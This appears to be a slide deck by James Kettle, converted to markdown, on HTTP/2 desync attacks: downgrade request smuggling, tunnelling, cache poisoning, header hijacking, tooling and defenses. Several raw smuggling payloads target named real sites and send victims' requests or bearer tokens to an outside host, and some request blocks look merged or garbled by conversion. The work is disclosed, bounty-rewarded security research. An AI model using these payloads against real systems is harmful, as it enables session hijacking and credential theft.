# HTTP/2: The Sequel is Always Worse
## By James Kettle

### Introduction
- **August 2019**: Discovery of HTTP Desync Attacks
- **September 2020**: The Bitbucket Mystery
- **January 2021**: Bitbucket Confirmed, But Unexploitable
- **March 2021**: Research Collision and Bitbucket Breakthrough
  - New, more powerful type of desync
  - Entire issue class becoming exploitable
  - Atlassian logging everyone out of Jira
  - Contacting CERT, awarding 3x maximum bounty

### Key Topics
- HTTP/2 Desync Attacks
- Request Tunneling
- HTTP/2 Exploit Primitives
- HTTP/2 Hacking Pitfalls, Tooling, and Defense

### Outline
- Live Q&A during the stream
- Discord: @albinowax
- Twitter: @albinowax

### Example Requests
#### HTTP/1.1 POST Request
```http
POST /login HTTP/1.1
Host: psres.net
User-Agent: burp
Content-Length: 9

x=123&y=4
```
#### HTTP/1.1 GET Request
```http
GET / HTTP/1.1
Host: psres.net
```
#### HTTP/1.1 Response
```http
HTTP/1.1 403 Forbidden
Content-Length: 6

Failed
```
#### HTTP/2 Request
```http
:method POST
:path /login
:authority psres.net
User-Agent: burp
Content-Length: 9

x=123&y=4
```
#### HTTP/2 GET Request
```http
:method GET
:path /robots.txt
:authority psres.net
```

### HTTP/2 Desync Attacks
- **Suggested Prior Reading**: HTTP Desync Attacks
- **Request Smuggling via HTTP/2 Downgrades**
  - Classic request smuggling: CL.TE or TE.CL (with exceptions)
  - HTTP/2 downgrade smuggling: H2.CL or H2.TE

#### H2.CL Desync Example
```http
POST /n HTTP/1.1
Host: www.netflix.com
Content-Length: 4
abcdGET /n HTTP/1.1
Host: 02.rs?x.netflix.com
Foo: barGET /anything HTTP/1.1
Host: www.netflix.com
Zuul/Netty
Back-end
```
- **CVE-2021-21295**
  - Front-end response:
    ```http
    HTTP/1.1 200 OK
    HTTP/1.1 302 Found
    Location: https://02.rs?x.netflix.com/n
    ```
  - Back-end response:
    ```http
    :method POST
    :path /n
    :authority netflix.com
    :method GET
    :path /anything
    :authority netflix.com
    ```

#### H2.TE Desync: URL Token Hijack
```http
POST /identity/XUI/ HTTP/1.1
Host: id.b2b.oath.com
Content-Length: 68
Transfer-Encoding: chunked
0
GET /oops HTTP/1.1
Host: psres.net
Content-Length: 10
x=
```
- **AWS ALB & Incapsula WAF**
  - Bounty: $27,000

#### H2.TE Desync: Header Hijack
```http
POST /account/login HTTP/1.1
Host: accounts.athena.aol.com
Content-Length: 104
Transfer-Encoding: chunked
0
GET /account/1/logout?next=https://psres.net/ HTTP/1.1
X-Ignore: X
OPTIONS / HTTP/1.1
Host: psres.net
Access-Control-Request-Headers: authorization
Authorization: Bearer eyJhbGwiOiJIUzI1NiIsInR6cCI6Ikâ€¦
```
- **Bounty**: $37,000

### Tunnelling
- **Rule Bypass, Header Spoofing, Internal Header Theft, Cache Poisoning, Direct Cross-User Attacks, Response Queue Poisoning**

### Possible Attacks
- **Connection-Reuse Style** dictates which attacks are possible
- **No Connection Reuse**
  - Example:
    ```http
    POST /n HTTP/1.1
    Host: example.com
    Content-Length: 4
    abcdGET /404plz HTTP/1.1
    Foo: bar
    GET /anything HTTP/1.1
    ```

### Tunnelling Confirmation
- **Example**
  ```http
  POST / HTTP/1.1
  Host: example.com
  Transfer-Encoding: chunked
  0
  GET / HTTP/1.1
  Host: example.com
  ```

### Leaking Internal Headers via Tunnelling
- **Example**
  ```http
  POST /blog HTTP/1.1
  Foo: bar
  Host: bitbucket.wpengine.com
  Content-Length: 200
  s=cow
  SSLClientCipher: TLS_AES_128
  Host: bitbucket.wpengine.com
  Content-length: 7
  foo=bar
  ```

### Cache Poisoning via Tunnelling
- **Example**
  ```http
  HTTP/1.1 404 Not Found
  Content-Type: text/html
  X-Cache-Info: cached
  Content-Length: 5891
  HTTP/1.1 301 Moved Permanently
  Location: https://bitbucket.org/wp-admin/?
  foo bar
  Host: x
  GET /wp-admin? HTTP/1.1
  Host: bitbucket.wpengine.com
  ```

### HTTP/2 Exploit Primitives
- **Ambiguous HTTP/2 Requests**
  - `:authority` and `host` both specify the host and are both optional!
- **Duplicate Path, Method, Scheme**
- **Host-Header Attacks**
- **URL Prefix Injection**

### Enabling Host-Header Attacks
- **Path Override**
  ```http
  :scheme http://start.mozilla.org/xyz?
  :method GET
  :path /ffx36.js
  :authority start.mozilla.org
  ```

### Header Name Splitting
- **Example**
  ```http
  GET / HTTP/1.1
  Host: redacted.net
  transfer-encoding: chunked:
  transfer-encoding: chunked
  ```

### Request Line Injection - Apache
- **Deny from all**
- **Essential Information**
  - HTTP/2 and HTTP/1.1 share the same port
  - Servers advertise HTTP/2 support via ALPN field in TLS handshake
  - Some servers forget to do this
  - Detect with:
    - HTTP Request Smuggler 'Hidden-H2'
    - Burp Scanner
    - `curl --http2 --http2-prior-knowledge`

### Hidden-HTTP/2
- **HTTP/2 promises great request encapsulation**
- **Sometimes requests break all subsequent requests**
- **Some servers subtly treat the first request differently**
- **Manage this using:**
  - Turbo Intruder: `requestsPerConnection`
  - Repeater: Send on new connection
  - Further research pending

### Connection State Traps
- **Existing tooling does not work**
- **Libraries/curl refuse to send most attacks**
- **Binary format rules out netcat/openssl**
- **Turbo Intruder**: Custom open-source H/2-stack, use as BApp/CLI/library
- **http2smugl**: Patched Golang, open source, CLI-only
- **Burp Suite**: Exposed via Repeater & Extender-API
- **Detection**: HTTP Request Smuggler
- **Timeout probe (favour FP)**
- **HEAD probe (favour FN)**

### Tooling Situation
- **Provided every case study**
- **Network Architects**: Use HTTP/2 end-to-end instead of downgrading
- **Server Vendors**: Enforce HTTP/1.1 limitations
- **Developers**: Drop HTTP/1.1 assumptions, don't trust `:scheme`

### Defense
- **References & Further Reading**
  - Whitepaper: [PortSwigger Research](https://portswigger.net/research/http2)
  - Labs: [PortSwigger Web Security](https://portswigger.net/web-security/request-smuggling)
  - Tool: [GitHub - PortSwigger HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler)
  - Emil Lerner's H/2 Research: [Standoff365](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
  - Response Smuggling: Pwning HTTP/1.1 Connections - Martin Doyhenard
  - Primary Sources
    - HTTP Desync Attacks: [PortSwigger Research](https://portswigger.net/research/http-desync-attacks)
    - @defparam's Response Queue Poisoning: [YouTube](https://youtu.be/3tpnuzFLU8g)

### Takeaways
- HTTP/2 breaks assumptions at multiple layers
- HTTP/2 downgrades are hazardous
- Request tunneling is a real threat

### Contact
- Email: PI:EMAIL
- Discord: @albinowax
- Twitter: @albinowax